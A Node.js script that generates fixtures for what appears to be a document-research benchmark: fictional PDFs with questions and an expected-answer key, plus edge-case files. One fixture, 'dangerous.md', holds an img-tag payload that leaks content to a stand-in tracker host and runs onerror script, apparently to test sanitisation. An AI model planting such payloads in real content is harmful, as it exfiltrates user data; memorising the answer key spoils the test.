/** Original fictional documents; CC0. Minimal deterministic PDF1.4 with searchable text. */
import { writeFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
const root=dirname(fileURLToPath(import.meta.url));
const documents = [
 {file:'01-solarprojekt.pdf',pages:[['Solarprojekt Lindenhof','Originales Testdokument, keine echten Personendaten.','Das Projekt Lindenhof nutzt Solarmodule auf dem Schuldach.','Die Anlage produziert 42000 Kilowattstunden Strom pro Jahr.','Der Batteriespeicher hat eine Kapazitaet von 18 Kilowattstunden.'],['Zeitplan und Finanzierung','Der geplante Betriebsbeginn ist der 15. Mai 2027.','Die Gemeinde investiert 68000 Euro in das Projekt.','Technische Ansprechpartnerin ist die fiktive Ingenieurin Mara Fink.']],question:'Wie viel Strom produziert das Solarprojekt pro Jahr?',expected:'42000',page:1},
 {file:'02-wasserlabor.pdf',pages:[['Wasserlabor Buchenbach','Fiktive Messdaten fuer den ResearchBench-Test.','Das Wasserlabor untersucht Nitrat im Buchenbach.','Die Probe vom 3. Juni enthaelt 17 Milligramm Nitrat pro Liter.','Der lokale Grenzwert im Versuch betraegt 25 Milligramm pro Liter.'],['Messverfahren','Die Proben werden jeden Dienstag um 09:30 Uhr genommen.','Nach der Entnahme lagern die Proben bei vier Grad Celsius.','Das Labor verwendet fuer diesen Versuch ein Photometer.']],question:'Wie hoch ist der Nitratwert der Probe vom 3. Juni?',expected:'17 Milligramm',page:1},
 {file:'03-forest-study.pdf',pages:[['Forest Study Cedar Valley','Fictional original research data for browser tests.','The Cedar Valley team planted 240 oak seedlings in autumn.','After one year, 216 seedlings survived the first winter.','The survival rate is ninety percent.'],['Field protocol','Researchers measure growth on the first Monday of each month.','The average annual height gain is 32 centimetres.','A protective fence keeps deer away from the experimental plot.']],question:'How many oak seedlings survived the first winter?',expected:'216',page:1}
];
function pdf(pages){
 const objects=[];const add=s=>(objects.push(s),objects.length);
 add('<< /Type /Catalog /Pages 2 0 R >>');add('');add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
 const kids=[];
 for(const lines of pages){const stream='BT\n/F1 12 Tf\n50 780 Td\n'+lines.map((s,i)=>(i?'0 -22 Td\n':'')+'('+s.replace(/[\\()]/g,'\\$&')+') Tj').join('\n')+'\nET\n';
 const streamId=add(`<< /Length ${Buffer.byteLength(stream)} >>\nstream\n${stream}endstream`);
 const pageId=add(`<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 3 0 R >> >> /Contents ${streamId} 0 R >>`);kids.push(`${pageId} 0 R`);}
 objects[1]=`<< /Type /Pages /Kids [${kids.join(' ')}] /Count ${pages.length} >>`;
 let out='%PDF-1.4\n% Original ResearchBench CC0 fixture\n';const offsets=[0];
 for(let i=0;i<objects.length;i++){offsets.push(Buffer.byteLength(out));out+=`${i+1} 0 obj\n${objects[i]}\nendobj\n`;}
 const start=Buffer.byteLength(out);out+=`xref\n0 ${objects.length+1}\n0000000000 65535 f \n`+offsets.slice(1).map(n=>`${String(n).padStart(10,'0')} 00000 n \n`).join('');
 out+=`trailer\n<< /Size ${objects.length+1} /Root 1 0 R >>\nstartxref\n${start}\n%%EOF\n`;return out;
}
for(const d of documents)writeFileSync(join(root,d.file),pdf(d.pages));
writeFileSync(join(root,'textless.pdf'),pdf([[]]));
writeFileSync(join(root,'corrupt.pdf'),'%PDF-1.4\nThis is intentionally corrupt; no xref or objects.');
writeFileSync(join(root,'unicode.txt'),'Originales CC0-Testdokument.\nGrüße aus Köln: Bäume speichern Kohlenstoff. 🌳\nDer fiktive Stadtwald speichert 730 Tonnen Kohlenstoff.\n');
writeFileSync(join(root,'dangerous.md'),'# Originales CC0-Testdokument\n\n<img src="https://tracker.invalid/leak?content=private-text" onerror="alert(1)">\n\nDie fiktive Waldschule wurde 1998 gegründet.\n');
writeFileSync(join(root,'long-source.txt'), Array.from({length:300},(_,i)=>`Fiktiver Forschungsabschnitt ${i+1}: Der Versuch dokumentiert das Wachstum von Buchen und Eichen im Stadtwald. Alle Daten stammen aus einer erfundenen Unterrichtsstudie. Messungen erfolgen jeden Montag.\n`).join(''));
writeFileSync(join(root,'expected.json'),JSON.stringify(documents.map(({file,question,expected,page})=>({file,question,expected,page})),null,2)+'\n');
